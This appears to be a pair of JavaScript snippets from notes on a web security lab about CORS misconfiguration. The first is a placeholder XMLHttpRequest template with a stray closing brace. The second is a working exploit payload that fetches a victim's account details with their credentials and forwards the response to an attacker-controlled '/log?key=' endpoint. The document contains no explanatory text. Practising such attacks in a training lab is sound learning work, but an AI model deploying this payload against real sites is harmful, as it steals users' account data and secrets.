```
<script>
let req = new XMLHttpRequest();
req.onreadystatechange = function(){
       if(this.readyState == 4 && this.status == 200){
       document.getElementById("demo").innerHTML = alert(this.responseText)
       }
       }
req.open("METHOD","URL with Endpoint", true);
withCredentials = true;
req.send();
}


</script>
```

```
`<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script>`
```
